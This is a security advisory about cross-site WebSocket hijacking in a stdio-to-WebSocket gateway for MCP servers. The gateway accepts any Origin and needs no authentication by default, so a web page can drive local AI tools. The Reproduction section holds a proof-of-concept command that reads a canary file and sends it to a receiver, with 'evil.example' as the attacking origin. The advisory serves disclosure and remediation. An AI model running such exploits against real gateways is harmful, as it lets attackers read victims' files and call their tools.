# SGW-2026-002 — Cross-Site WebSocket Hijacking (CSWSH)

## Summary

The stdio→WebSocket gateway accepts WebSocket upgrades from **any** `Origin`. WebSockets are not subject to the same-origin policy, and the server neither validates `Origin` nor requires a token by default. Any page the victim visits can therefore open `ws://127.0.0.1:<port>/ws` and drive the local MCP server with the victim's privileges — reading files, calling tools, invoking APIs exposed through MCP.

## Affected component

- `src/gateways/stdioToWs.ts` — upgrade handling; no `Origin` validation
- `src/lib/apiKey.ts` — authentication is optional and not enabled by default

## Impact

- Full MCP tool execution under the victim's account/context from an arbitrary web origin.
- Demonstrated: a page served from `http://127.0.0.1:8089` read the canary file through a filesystem-style MCP tool; the headless-Chromium proof is `evidence/cswsh_browser.png`.
- Multiple origins accepted: `http://evil.example`, `null` (sandboxed/opaque origin), `https://attacker.test:4443`, `http://localhost:9999` — 12/12 exfiltration runs.
- With default settings the gateway binds all interfaces, so the attack also works cross-host when the port is reachable.

## Reproduction

```bash
./scripts/bootstrap.sh
python3 pocs/receiver.py 8899 &                       # proof sink
./pocs/cswsh_ws_poc.js ws://127.0.0.1:18081/ws \
    evidence/canary.txt http://127.0.0.1:8899 http://evil.example
# exit 0 and receiver output containing the canary == exploited

# browser proof: serve pocs/cswsh_browser.html and open it from an unrelated origin
```

A full sweep is part of `pocs/verify_all.sh`.

## Root cause

The upgrade handler never inspects `req.headers.origin`, and the default configuration has no authentication. Browsers attach the victim page's origin to the handshake but still allow the connection; the server accepts it. `--apiKey` closes the hole only when enabled (verified: unauthenticated upgrade refused with exit code `2`; `Authorization: Bearer` grants access).

## Remediation

1. Validate `Origin` against an allowlist (loopback origins only by default) and reject others with `403` during the upgrade.
2. Require authentication for WebSocket upgrades (reuse the existing API-key check), not just for HTTP endpoints.
3. Bind loopback by default and document exposure.
